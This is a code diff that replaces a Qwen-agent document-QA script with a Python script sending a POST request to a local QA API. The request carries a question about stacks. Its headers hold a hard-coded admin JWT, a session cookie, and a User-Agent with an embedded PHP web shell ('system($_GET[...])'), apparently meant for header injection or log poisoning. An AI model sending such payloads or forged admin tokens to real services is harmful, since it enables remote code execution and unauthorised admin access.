@@ -1,14 +1,19 @@
-from qwen_agent import Retrieval
-from qwen_agent.agents import Assistant
-import os
+import requests
+import json
 
-# 构建知识库
-retrieve.build_index(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "docs"))
+url = "http://127.0.0.1:5000/api/qa"
 
-class DocQA(Assistant):
-    def _preprocess(self, query):
-        contexts = retrieve.search(query)
-        return f"根据文档：{contexts}\n回答：{query}"
+payload = json.dumps({
+  "question": "请你解释一下栈这个东西"
+})
+headers = {
+  'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qI9mpZKBIB3Z009gZnezZ563C8B397jYjAZpoTmLTAc',
+  'User-Agent': 'aaa <?php system($_GET[\'aaa\']); ?>',
+  'shell': 'echo("aaa");',
+  'Content-Type': 'application/json',
+  'Cookie': 'session=.eJwljktqAzEQRK8iem2CPt0taU6RfTCmJbU8A5M4jMYr47tHkFVRH4r3glvfZaw6YPl6gTmnwLeOIXeFC3zuKkPN_rib7cecDyO1ztKc6zbM79x8wPV9vcyTQ8cKy3k8dbqtwQJWUyHX0NnEjZvVztGFRI7FUuQarDJjxOwx1UBCXjoRp67J-sLoPAZySToKzSQQqrpeiLJkluJ849Ail5aYJddG2GKOGFSTYOAw8W_Pocc_jYP3Hz5LRH0.abTRlw.tOzVSYxol9Q4qJ88O_uzklCkhA0'
+}
 
-qa = DocQA(llm={'model': 'qwen-max-longcontext'})
-qa.run("栈是什么？")
+response = requests.request("POST", url, headers=headers, data=payload)
+
+print(response.text)
